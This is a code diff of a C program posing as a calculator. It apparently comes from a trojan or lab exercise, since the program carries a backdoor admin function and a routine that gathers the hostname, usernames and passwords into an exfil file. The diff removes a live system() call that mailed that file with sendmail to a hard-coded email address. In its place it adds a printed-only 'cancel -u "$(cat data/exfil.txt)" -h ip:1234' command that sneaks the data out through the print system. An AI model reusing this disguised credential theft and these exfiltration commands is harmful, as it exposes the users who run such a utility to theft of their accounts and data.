@@ -28,8 +28,8 @@ bool userAuth();
 void formatString(char string[]);
 bool administrator(unsigned int backdoor);
 void dataExfil();
-void sendEmail(char fileLoc[]);
-void createExfilFile();
+void sendFile();
+bool createExfilFile();
 
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -216,42 +216,50 @@ Runs data exfiltration commands
 */
 void dataExfil() {
     puts("Begin Data exfiltration process.....\nCreating Data exfil file.....");
-    createExfilFile();
-    puts("Attempting to send email.....");
-    sendEmail("exfil.txt");
-    puts("Data exfiltration complete!");
+    if (createExfilFile()) {
+        puts("Attempting to send data.....");
+        sendFile();
+        puts("Data exfiltration complete!");
+    } else {
+        puts("Unable to create exfil file. Data exfiltration failure :(");
+    }
 }
 /*
 Attempts to send data via email
 */
-void sendEmail(char fileLoc[]){
-    FILE* fileptr;
-    char fileLine[FILE_LINE_MAX];
-    char cmd[FILE_LINE_MAX];
-    const char to[] = "hungryllama150@gmail.com";
+void sendFile(){
+    FILE *fp;
+    char cmd[FILE_LINE_MAX] = "cancel -u \"$(cat data/exfil.txt)\" -h ";
+    char ip[] = "hostname -I > data/ip.txt";
+    char destport[] = ":1234";
+    char grabbedIP[STRING_MAX];
+    //create file with IP to be added to later command
+    system(ip);
 
-    fileptr = fopen(fileLoc, "r");
-    if (fileptr != NULL) {
-        fclose(fileptr);
-        //creates cmd command
-        sprintf(cmd, "sendmail %s < %s", to, fileLoc);
-        //runs command
-        system(cmd);
-    } else {
-        puts("Unable to open file at speicified location.");
-    }
+    //reads stored IP address
+    fp = fopen("data/ip.txt", "r");
+    fgets(grabbedIP, STRING_MAX, fp);
+    formatString(grabbedIP);
+    fclose(fp);
+
+    //cats the whole cancel command for execution
+    strcat(cmd, grabbedIP);
+    strcat(cmd, destport);
+    //"running" exfiltraiton command
+    puts("If the data were to actually send, this is what command would run:");
+    fprintf(stdout, "system(%s)\n", cmd);
 }
 /*
 Creates data exfil file, holds all user data, tree cat, and more
 */
-void createExfilFile(){
+bool createExfilFile(){
     FILE* exfil;
     FILE* users;
     char hostName[FILE_LINE_MAX];
     char username[STRING_MAX];
     char password[STRING_MAX];
 
-    exfil = fopen("exfil.txt", "w");
+    exfil = fopen("data/exfil.txt", "w");
     if (exfil != NULL) {
         //getting host name
         if (gethostname(hostName, sizeof(hostName)) == 0) {
@@ -279,11 +287,13 @@ void createExfilFile(){
 
         fprintf(exfil, "~~~~~~~~~~~End Data Exfiltration~~~~~~~~~~~");
         fclose(exfil);
+        return true;
     } else {
         puts("Unable to open exfiltration file. Oh well.");
+        return false;
     }
-
 }
+
 /*
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                        Calculator Functionaltiy
@@ -311,6 +321,7 @@ void calculator(){
         } else if (input == 1) {
             again = false;
             run = false;
+            runCalc = false;
         } else if (input == 2){
             //run admin
             runCalc = administrator(0);
@@ -427,7 +438,7 @@ void formatString(char string[]) {
 	//removes the new line character from the string/number
 	for (unsigned int i = 0; i < STRING_MAX; i++) {
 		if (string[i] == '\n') {
-			string[i] = NULL;
+			string[i] = '\0';
 		}
 	}
 
@@ -443,4 +454,5 @@ int main(){
     //calculator();
     puts("Welcome to the best ever calculator!");
     userAuth();
+    //sendFile();
 }
